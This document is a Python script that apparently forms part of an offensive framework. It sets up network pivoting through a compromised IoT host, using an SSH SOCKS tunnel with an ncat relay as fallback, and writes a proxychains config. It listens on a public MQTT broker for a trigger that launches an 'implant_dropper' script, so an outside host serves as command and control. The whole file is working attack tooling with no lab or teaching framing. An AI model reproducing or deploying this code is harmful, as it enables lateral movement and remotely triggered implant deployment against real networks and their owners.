#!/usr/bin/env python3
import os, json, time, socket, subprocess, threading
from pathlib import Path
from websocket import create_connection
import paho.mqtt.client as mqtt

AGENT_ID = "pivot_orchestrator"
ALERT_FILE = "webgui/alerts.json"
AGENT_JSON = "webgui/agents.json"
WS_SERVER = "ws://127.0.0.1:8765"
SOCKS_CONF = "output/proxychains.conf"
CHAIN_SCRIPT = "implant_dropper.py"
MQTT_BROKER = "broker.hivemq.com"
MQTT_TOPIC = "redot/agent_pivot"
PIVOT_IP = "192.168.1.50"
SSH_USER = "iot"
SSH_KEY = os.path.expanduser("~/.ssh/id_rsa")

def log(msg):
    print(f"[PIVOT] {msg}")
    Path("output").mkdir(parents=True, exist_ok=True)
    with open("output/pivot.log", "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

def push_alert(message):
    alert = {
        "agent": AGENT_ID,
        "alert": message,
        "type": "pivot",
        "timestamp": time.time()
    }
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps(alert) + "\n")
    try:
        ws = create_connection(WS_SERVER)
        ws.send(json.dumps(alert))
        ws.close()
    except:
        pass

def update_inventory():
    agent = {
        "id": AGENT_ID,
        "ip": PIVOT_IP,
        "capabilities": ["pivot", "ssh", "relay"],
        "status": "active",
        "timestamp": time.time()
    }
    agents = []
    if os.path.exists(AGENT_JSON):
        with open(AGENT_JSON) as f:
            try:
                agents = json.load(f)
            except:
                agents = []
    agents = [a for a in agents if a.get("id") != AGENT_ID]
    agents.append(agent)
    with open(AGENT_JSON, "w") as f:
        json.dump(agents, f, indent=2)

def deploy_ssh_pivot(ip, user, key_path):
    try:
        cmd = f"ssh -i {key_path} -N -D 1080 {user}@{ip}"
        subprocess.Popen(cmd, shell=True)
        log(f"SSH pivot: {ip}")
        push_alert(f"SSH pivot started to {ip}")
        return True
    except:
        return False

def setup_passive_relay(ip):
    relay_cmd = f"ncat -lvp 1080 -c 'ncat {ip} 1080'"
    subprocess.Popen(relay_cmd, shell=True)
    log("Passive SOCKS relay fallback started")
    push_alert("Fallback relay proxy enabled")

def export_socks_config(proxy_ip="127.0.0.1", port=1080):
    conf = "strict_chain\nproxy_dns\n[ProxyList]\nsocks5 {} {}\n".format(proxy_ip, port)
    with open(SOCKS_CONF, "w") as f:
        f.write(conf)
    log("ProxyChains config saved")

def on_connect(client, userdata, flags, rc):
    log("MQTT connected")
    client.subscribe(MQTT_TOPIC)

def on_message(client, userdata, msg):
    log(f"MQTT trigger: {msg.payload.decode()}")
    if b"chain" in msg.payload:
        push_alert("Agent chain trigger via MQTT")
        subprocess.Popen(["python3", CHAIN_SCRIPT])

def mqtt_trigger_listener():
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(MQTT_BROKER, 1883, 60)
    client.loop_forever()

def main():
    push_alert("Pivot orchestrator active")
    update_inventory()
    ok = deploy_ssh_pivot(PIVOT_IP, SSH_USER, SSH_KEY)
    if not ok:
        setup_passive_relay(PIVOT_IP)
    export_socks_config()
    threading.Thread(target=mqtt_trigger_listener, daemon=True).start()
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
